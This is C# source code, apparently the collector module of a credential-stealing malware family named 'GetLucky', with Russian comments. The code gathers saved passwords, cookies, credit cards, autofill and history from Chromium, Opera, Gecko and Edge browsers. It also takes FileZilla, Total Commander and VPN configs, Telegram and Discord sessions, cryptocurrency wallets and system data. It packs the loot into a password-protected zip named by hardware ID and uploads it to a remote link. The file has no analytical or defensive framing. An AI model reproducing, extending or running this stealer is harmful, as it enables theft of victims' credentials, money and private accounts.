using Ionic.Zip;
using Ionic.Zlib;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GetLucky
{

    public static class Collection
    {
        [STAThread]
        public static void GetChromium()
        {
            try
            {
                Chromium.GetCards(Help.Cards);
                Chromium.GetCookies(Help.Cookies);
                Chromium.GetPasswords(Help.Passwords);
                Chromium.GetAutofills(Help.Autofills);
                Chromium.GetDownloads(Help.Downloads);
                Chromium.GetHistory(Help.History);
                Chromium.GetPasswordsOpera(Help.Passwords);
                Chromium.GetCookiesOpera(Help.Cookies);
            }
            catch { }
        }
        public static void GetGecko()
        {
            try
            {
                Steal.Cookies();
                Steal.Passwords();
            }
            catch { }
        }
        public static void GetCollection()
        {
            #region Collector
            try
            {
                // Создаем временные директории для сбора лога
                Directory.CreateDirectory(Help.collectionDir);
                Directory.CreateDirectory(Help.Browsers);
                Directory.CreateDirectory(Help.Passwords);
                Directory.CreateDirectory(Help.Autofills);
                Directory.CreateDirectory(Help.Downloads);
                Directory.CreateDirectory(Help.Cookies);
                Directory.CreateDirectory(Help.History);
                Directory.CreateDirectory(Help.Cards);
            }
            catch { }
            Task[] t0 = new Task[1] { new Task(() => Files.GetFiles(Help.collectionDir)), };
            Task[] t1 = new Task[1] { new Task(() => GetChromium()), };
            Task[] t2 = new Task[1] { new Task(() => GetGecko()), };
            Task[] t3 = new Task[1] { new Task(() => Edge.GetEdge(Help.Passwords)), };
            Task[] t5 = new Task[1] { new Task(() => FileZilla.GetFileZilla(Help.collectionDir)), };
            Task[] t6 = new Task[1] { new Task(() => TotalCommander.GetTotalCommander(Help.collectionDir)), };
            Task[] t7 = new Task[1] { new Task(() => ProtonVPN.GetProtonVPN(Help.collectionDir)), };
            Task[] t8 = new Task[1] { new Task(() => OpenVPN.GetOpenVPN(Help.collectionDir)), };
            Task[] t9 = new Task[1] { new Task(() => NordVPN.GetNordVPN(Help.collectionDir)), };
            Task[] t10 = new Task[1] { new Task(() => Telegram.GetTelegram(Help.collectionDir)), };
            Task[] t11 = new Task[1] { new Task(() => Discord.GetDiscord(Help.collectionDir)), };
            Task[] t12 = new Task[1] { new Task(() => Wallets.GetWallets(Help.collectionDir)), };
            Task[] t13 = new Task[1] { new Task(() => Systemsinfo.GetSystemsData(Help.collectionDir)), };
            try
            {
                new Thread(() => { foreach (var t in t0) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t1) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t2) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t3) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t5) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t6) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t7) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t8) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t9) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t10) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t11) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t12) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t13) t.Start(); }).Start();

                Task.WaitAll(t0);
                Task.WaitAll(t1);
                Task.WaitAll(t2);
                Task.WaitAll(t3);
                Task.WaitAll(t5);
                Task.WaitAll(t6);
                Task.WaitAll(t7);
                Task.WaitAll(t8);
                Task.WaitAll(t9);
                Task.WaitAll(t10);
                Task.WaitAll(t11);
                Task.WaitAll(t12);
                Task.WaitAll(t13);



            }
            catch { }
            #endregion
            try
            {

                // Пакуем в апхив с паролем
                string zipArchive = Help.dir + "\\LOG_" + Help.HWID +".zip";
                using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
                {
                    zip.Password = Program.passzip;
                    zip.ParallelDeflateThreshold = -1;
                    zip.UseZip64WhenSaving = Zip64Option.Always;
                    zip.CompressionLevel = CompressionLevel.Default; // Задаем степень сжатия 
                    zip.AddDirectory(Help.collectionDir); // Кладем в архив содержимое папки с логом
                    zip.Save(zipArchive); // Сохраняем архив    
                }

                Thread.Sleep(1000);

                WebClient client = new WebClient();
                Uri link = new Uri(Program.link);
                client.UploadFile(link, zipArchive);
            }
            catch
            {


            }

        }
    }
}
